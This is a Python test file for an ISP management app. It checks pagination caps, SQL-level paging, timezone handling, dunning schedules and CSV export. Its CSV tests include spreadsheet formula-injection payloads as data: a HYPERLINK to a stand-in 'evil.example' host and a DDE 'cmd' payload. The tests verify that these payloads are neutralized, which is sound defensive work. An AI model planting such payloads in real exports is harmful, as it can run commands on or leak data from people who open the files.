"""Remediation pack: D25 (critical performance) + D7/D32 (high date/export) findings.

Covers six remediation requirements:

  1. ``test_pagination_default_limit_100`` — ``DEFAULT_LIMIT`` is now a bounded 100.
  2. ``test_pagination_max_limit_1000_enforced`` — explicit overflow ⇒ HTTPException 422.
  3. ``test_records_list_uses_sql_offset_limit`` — list endpoint emits SQL LIMIT/OFFSET.
  4. ``test_csv_export_neutralizes_formula_injection`` — leading ``=/+/-/@`` cells get ``'`` prefix.
  5. ``test_parse_dt_naive_coerced_to_utc`` — every shared ``_parse_dt`` returns tz-aware.
  6. ``test_dunning_next_action_anchored_to_opened_at`` — sweep lag does not shift schedule.
"""
from __future__ import annotations

import csv
import io
import uuid
from datetime import datetime, timedelta, timezone

import pytest
from fastapi import HTTPException
from sqlalchemy import event, select

from app.db import SessionLocal, engine
from app.models.dunning import DunningCase, DunningPolicy
from app.pagination import DEFAULT_LIMIT, MAX_LIMIT, Page
from app.routers.export import _cell, _neutralize_formula
from app.services import dunning as dunning_service


# ============================================================================
# 1. DEFAULT_LIMIT is 100
# ============================================================================

def test_pagination_default_limit_100():
    """Module contract: DEFAULT_LIMIT is now 100 (was None → unbounded)."""
    assert DEFAULT_LIMIT == 100, "DEFAULT_LIMIT must be 100 — was unbounded (D25 critical)"
    # And the from_request path uses it when no limit param is supplied.
    p = Page.from_request(limit=None, offset=0)
    assert p.limit == 100


# ============================================================================
# 2. MAX_LIMIT (1000) is enforced — explicit overflow rejects with 422
# ============================================================================

def test_pagination_max_limit_1000_enforced():
    """MAX_LIMIT == 1000 and an explicit `limit` over the cap raises HTTPException 422."""
    assert MAX_LIMIT == 1000, "MAX_LIMIT must be 1000 (was 500)"

    # At the cap is fine.
    p = Page(limit=MAX_LIMIT)
    assert p.limit == MAX_LIMIT

    # One over the cap is rejected.
    with pytest.raises(HTTPException) as exc:
        Page(limit=MAX_LIMIT + 1)
    assert exc.value.status_code == 422
    assert "MAX_LIMIT" in str(exc.value.detail) or "1000" in str(exc.value.detail)

    # Also via from_request.
    with pytest.raises(HTTPException) as exc:
        Page.from_request(limit=MAX_LIMIT + 50, offset=0)
    assert exc.value.status_code == 422


# ============================================================================
# 3. records.list_records pushes LIMIT / OFFSET into SQL
# ============================================================================

async def test_records_list_uses_sql_offset_limit(client, admin):
    """The list endpoint must emit a SQL statement that includes LIMIT (and OFFSET when
    offset > 0). Previously the endpoint loaded the whole tenant slice into Python and paged
    in-memory; that was the D25 critical. Catch the SQL via a sqlalchemy ``before_cursor_execute``
    listener so a regression to the in-memory model fails this test loudly.
    """
    seen: list[str] = []

    def _capture(conn, cursor, statement, parameters, context, executemany):
        # Only capture statements that target the ``record`` table — every list call hits a
        # bunch of housekeeping SELECTs (auth, grants, tenants) we don't care about here.
        if " record " in statement.lower() or 'from "record"' in statement.lower() or 'from record' in statement.lower():
            seen.append(statement)

    sync_engine = engine.sync_engine
    event.listen(sync_engine, "before_cursor_execute", _capture)
    try:
        # Create a few leads so the list has rows; we ask for limit=2 offset=1.
        tok = f"zperf{uuid.uuid4().hex[:6]}"
        for i in range(4):
            r = await client.post("/api/leads", headers=admin, json={"name": f"{tok}_{i}"})
            assert r.status_code == 201, r.text

        # Reset capture for the list call itself so we only inspect the GET.
        seen.clear()
        r = await client.get(f"/api/leads?q={tok}&sort=created_at&limit=2&offset=1", headers=admin)
        assert r.status_code == 200, r.text
    finally:
        event.remove(sync_engine, "before_cursor_execute", _capture)

    # At least one of the captured SELECTs on the record table must carry LIMIT.
    record_selects = [s for s in seen if s.lstrip().lower().startswith("select")]
    assert record_selects, "expected at least one SELECT on the record table during list"
    has_limit = any("limit" in s.lower() for s in record_selects)
    has_offset = any("offset" in s.lower() for s in record_selects)
    assert has_limit, (
        "list_records must push LIMIT into SQL (D25 critical regression — the endpoint "
        "is materialising the whole tenant slice again)"
    )
    assert has_offset, "list_records must push OFFSET into SQL when offset > 0"


# ============================================================================
# 4. CSV / XLSX formula injection neutralization
# ============================================================================

def test_csv_export_neutralizes_formula_injection():
    """Every cell whose first non-whitespace character is one of ``= + - @ \\t \\r`` gets a
    leading apostrophe (OWASP CSV-Injection mitigation, H19 / D32). Pass-through otherwise."""
    # Direct neutralizer
    assert _neutralize_formula("=HYPERLINK(\"http://evil\")") == "'=HYPERLINK(\"http://evil\")"
    assert _neutralize_formula("+1+1") == "'+1+1"
    assert _neutralize_formula("-CMD()") == "'-CMD()"
    assert _neutralize_formula("@SUM(A1)") == "'@SUM(A1)"
    assert _neutralize_formula("\t=1") == "'\t=1"
    # Leading whitespace before the dangerous char is also caught.
    assert _neutralize_formula("   =1+1") == "'   =1+1"
    # Benign values pass through unchanged.
    assert _neutralize_formula("Alice") == "Alice"
    assert _neutralize_formula("42") == "42"
    assert _neutralize_formula("") == ""
    assert _neutralize_formula(None) is None  # falsy passthrough

    # Through the public _cell path used by CSV writer.
    assert _cell("=cmd|'/c calc'!A0") == "'=cmd|'/c calc'!A0"
    assert _cell("normal text") == "normal text"
    # Bool and list paths still neutralize the result if dangerous.
    assert _cell(["=evil", "ok"]).startswith("'")  # "=evil; ok" → leads with =


async def test_csv_export_endpoint_neutralizes_formula_injection(client, admin):
    """End-to-end: a lead whose Name field is ``=HYPERLINK(...)`` exports as ``'=HYPERLINK(...)``."""
    tok = f"zexpinj{uuid.uuid4().hex[:6]}"
    malicious = f"=HYPERLINK(\"http://evil.example/?t={tok}\",\"click\")"
    r = await client.post("/api/leads", headers=admin, json={"name": malicious})
    assert r.status_code == 201, r.text

    # We can't `q=` for the leading '=' easily (URL-encoded), so just dump and find the row.
    r = await client.get(f"/api/leads/export?format=csv&q={tok}", headers=admin)
    assert r.status_code == 200, r.text
    rows = list(csv.reader(io.StringIO(r.text.lstrip("﻿"))))   # strip the UTF-8 BOM
    name_idx = rows[0].index("Full Name")                             # default (en) export header = field label
    # Find the data row whose Name column contains our token; assert it's defanged.
    data_rows = [row for row in rows[1:] if tok in row[name_idx]]
    assert data_rows, "exported CSV must contain our planted row"
    name_cell = data_rows[0][name_idx]
    assert name_cell.startswith("'="), (
        f"formula-injection cell was not neutralized — got {name_cell!r}; "
        "expected leading apostrophe per OWASP CSV-Injection mitigation"
    )


# ============================================================================
# 5. _parse_dt coerces tz-naive to UTC across every router copy
# ============================================================================

def test_parse_dt_naive_coerced_to_utc():
    """Every shared ``_parse_dt`` (billing, calendar, tasks, workitems, noc_inventory) must
    coerce a tz-naive ISO string to a tz-aware UTC datetime (H8 / D7). A tz-aware string
    must be passed through unchanged."""
    from app.routers._billing_shared import _parse_dt as billing_parse
    from app.routers.calendar import _parse_dt as calendar_parse
    from app.routers.tasks import _parse_dt as tasks_parse
    from app.routers.workitems import _parse_dt as workitems_parse
    from app.routers.noc_inventory import _parse_dt as noc_parse

    naive = "2026-01-15T08:30:00"
    aware = "2026-01-15T08:30:00+02:00"

    for name, fn in [
        ("billing", billing_parse),
        ("calendar", calendar_parse),
        ("tasks", tasks_parse),
        ("workitems", workitems_parse),
        ("noc", noc_parse),
    ]:
        out = fn(naive, "field")
        assert out is not None, f"{name}._parse_dt returned None for {naive!r}"
        assert out.tzinfo is not None, (
            f"{name}._parse_dt returned a tz-NAIVE datetime for {naive!r} — "
            "H8/D7 regression (must coerce to UTC)"
        )
        assert out.utcoffset() == timedelta(0), (
            f"{name}._parse_dt did not coerce naive input to UTC (got offset {out.utcoffset()})"
        )

        # tz-aware inputs are passed through with their offset.
        out2 = fn(aware, "field")
        assert out2.tzinfo is not None
        assert out2.utcoffset() == timedelta(hours=2)


# ============================================================================
# 6. Dunning next_action_at anchored on opened_at (sweep-lag-tolerant)
# ============================================================================

async def test_dunning_next_action_anchored_to_opened_at(client, admin):
    """After ``advance_case`` runs LATE (e.g. the sweep was 2 days behind), the next step's
    ``next_action_at`` must still land at ``opened_at + next_step.day_offset`` rather than
    ``now + delta`` — otherwise schedules drift forward by however long the sweep was late
    (H10 / D7)."""
    from app.models.user import User
    from app.models.party import Account, Party
    from app.models import Invoice

    # Resolve a tenant id (any tenant — we'll use admin's).
    async with SessionLocal() as s:
        u = (await s.execute(select(User).where(User.email == "admin@demo.isp"))).scalar_one()
        tenant_id = u.tenant_id

        # Stand up a policy with 3 steps at day_offsets 0, 5, 12.
        policy = DunningPolicy(
            tenant_id=tenant_id,
            name=f"RemediationPolicy-{uuid.uuid4().hex[:6]}",
            description="H10 anchor test",
            is_default=False,
            active=True,
            steps_json=[
                {"day_offset": 0, "action": "NOTICE", "params": {"template": "t1"}},
                {"day_offset": 5, "action": "NOTICE", "params": {"template": "t2"}},
                {"day_offset": 12, "action": "NOTICE", "params": {"template": "t3"}},
            ],
            applies_to_tariff_plan_ids=None,
        )
        s.add(policy)
        await s.flush()

        # Bug fix (FK fixture): the previous version of this test set
        # account_id=uuid.uuid4() and triggering_invoice_id=uuid.uuid4() without ever
        # creating the parent rows — the INSERT failed the FK constraints
        # (dunning_case.account_id → account.id, dunning_case.triggering_invoice_id →
        # invoice.id). Seed real parent rows so the FK passes and the test can actually
        # exercise advance_case.
        party = Party(
            tenant_id=tenant_id,
            type="individual",
            name=f"DunningAnchor Party {uuid.uuid4().hex[:6]}",
            status="active",
        )
        s.add(party)
        await s.flush()

        account = Account(
            tenant_id=tenant_id,
            holder_party_id=party.id,
            type="residential",
            currency="AMD",
            billing_cycle="monthly",
            status="active",
        )
        s.add(account)
        await s.flush()

        # Minimal Invoice row to satisfy triggering_invoice_id FK. We only need the FK
        # to point somewhere real — the dunning service body for advance_case does not
        # touch this invoice (it walks subscriptions + services off the account).
        invoice = Invoice(
            tenant_id=tenant_id,
            customer_id=None,
            account_id=account.id,
            number=f"INV-DUN-{uuid.uuid4().hex[:6]}",
            total=1000,
            status="ISSUED",
        )
        s.add(invoice)
        await s.flush()

        # Open a case anchored 7 days ago. Force step 0 (NOTICE) executed already.
        opened = datetime.now(timezone.utc) - timedelta(days=7)
        case = DunningCase(
            tenant_id=tenant_id,
            account_id=account.id,
            triggering_invoice_id=invoice.id,
            policy_id=policy.id,
            current_step_index=0,
            step_entered_at=opened,
            next_action_at=opened + timedelta(days=5),  # step 1 was due at opened + 5d
            status="ACTIVE",
            opened_at=opened,
        )
        s.add(case)
        await s.commit()
        case_id = case.id
        opened_at = case.opened_at

    # Simulate the sweep firing LATE — advance the case now, which is opened_at + 7d (2 days
    # past the step-1 due time of opened_at + 5d).
    async with SessionLocal() as s:
        c = (await s.execute(select(DunningCase).where(DunningCase.id == case_id))).scalar_one()
        await dunning_service.advance_case(s, c)
        await s.commit()

    # After advance, current_step_index=1 (we ran step 1) and next_action_at must point at
    # ``opened_at + step2.day_offset`` = opened_at + 12d — NOT ``now + (12-5)`` (which would
    # be opened_at + 14d, drifted 2 days by the sweep lag).
    async with SessionLocal() as s:
        c = (await s.execute(select(DunningCase).where(DunningCase.id == case_id))).scalar_one()
        assert c.current_step_index == 1, "advance must move to step 1"
        expected = opened_at + timedelta(days=12)
        # Allow tiny wall-clock slop (millisecond-level) but reject 2-day drift.
        delta = abs((c.next_action_at - expected).total_seconds())
        assert delta < 60, (
            f"next_action_at drifted by {delta}s — must anchor on opened_at + day_offset, "
            f"not now() + delta (got {c.next_action_at!r}, expected {expected!r})"
        )
